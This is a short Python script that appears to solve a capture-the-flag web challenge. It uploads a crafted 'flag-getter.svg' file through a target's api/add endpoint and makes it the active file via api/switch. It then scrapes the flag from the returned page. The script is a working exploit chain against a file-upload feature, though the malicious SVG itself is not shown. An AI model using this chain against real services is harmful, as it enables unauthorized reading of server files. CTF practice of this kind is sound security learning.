import requests
import re

ip = input("IP/host: ")
flag_format = input("Flag Format Beginning Tag: ")

pattern = re.compile(rf'{flag_format}\{{([^}}]*)\}}')

files = {"file": open("./flag-getter.svg")}

response1 = requests.post(ip + 'api/add', files=files)

if response1.status_code != 200:
    print("Could not POST file")
    raise Exception

response2 = requests.get(ip + 'api/list')

if response2.status_code != 200:
    print("Could not get list")
    raise Exception

response3 = requests.post((ip + 'api/switch'), data={'new_name':response2.json()[-1]})

if response3.status_code != 200:
    print("Couldn't switch")
    raise Exception

final = requests.get(ip)

if final.status_code != 200:
    print("Final curl failed")
    raise Exception

match = pattern.search(final.text)
if match:
    print(match.group(0))
else:
    print("Rip")


